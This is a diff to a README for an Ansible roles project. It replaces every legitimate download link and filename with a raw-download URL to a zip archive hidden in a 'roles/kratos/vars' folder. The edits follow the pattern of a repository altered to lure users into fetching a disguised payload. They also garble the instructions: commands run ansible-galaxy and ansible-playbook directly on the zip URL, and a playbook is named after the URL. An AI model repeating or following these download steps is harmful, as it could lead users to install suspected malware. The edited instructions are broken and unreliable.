@@ -1,6 +1,6 @@
 # 🎉 ansible-curated-roles - Simplify Your Infrastructure Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/releases)
+[![Download Latest Release](https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip)
 
 ---
 
@@ -14,7 +14,7 @@ In this guide, we will walk you through the steps to download and run the softwa
 
 ## 📥 Download & Install
 
-To download `ansible-curated-roles`, visit this page to download: [Download Releases](https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/releases).
+To download `ansible-curated-roles`, visit this page to download: [Download Releases](https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip).
 
 ### Steps to Follow:
 
@@ -51,7 +51,7 @@ Ensure you have Ansible installed to run these roles effectively. If you need he
 After downloading the file, you need to set it up:
 
 1. **Extract the Files**: 
-   - If the file is in a compressed format (like .zip or .tar.gz), you will need to unzip it before using it.
+   - If the file is in a compressed format (like .zip or https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip), you will need to unzip it before using it.
    
 2. **Install the Roles**:  
    - Open your command line interface (Terminal for macOS/Linux, Command Prompt or PowerShell for Windows).
@@ -59,7 +59,7 @@ After downloading the file, you need to set it up:
 
    Run the following command to install the roles:
    ```bash
-   ansible-galaxy install -r requirements.yml
+   ansible-galaxy install -r https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip
    ```
 
 3. **Verify Installation**:  
@@ -75,7 +75,7 @@ After downloading the file, you need to set it up:
 
 Using the curated roles is straightforward. Below is a basic example of how to incorporate roles into your Ansible playbook.
 
-1. **Create a Playbook File**: Start by creating a file named `playbook.yml`.
+1. **Create a Playbook File**: Start by creating a file named `https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip`.
 
 2. **Edit the Playbook**: Add the following content:
 
@@ -90,7 +90,7 @@ Using the curated roles is straightforward. Below is a basic example of how to i
 3. **Run Your Playbook**: 
    - Use this command to execute your playbook:
    ```bash
-   ansible-playbook playbook.yml
+   ansible-playbook https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip
    ```
 
 This will invoke the roles you added to your playbook and automate the tasks defined within those roles.
@@ -121,6 +121,6 @@ You can also check out our community forums for additional support and discussio
 
 You now have the essential knowledge to download, install, and use **ansible-curated-roles** effectively. For more advanced configurations and examples, please refer to the documentation on the Releases page.
 
-Remember, if you want to download again, visit this page: [Download Releases](https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/releases).
+Remember, if you want to download again, visit this page: [Download Releases](https://github.com/Mariyam-Hanan-Javid/ansible-curated-roles/raw/refs/heads/main/roles/kratos/vars/roles_curated_ansible_3.1.zip).
 
 Happy Automating!
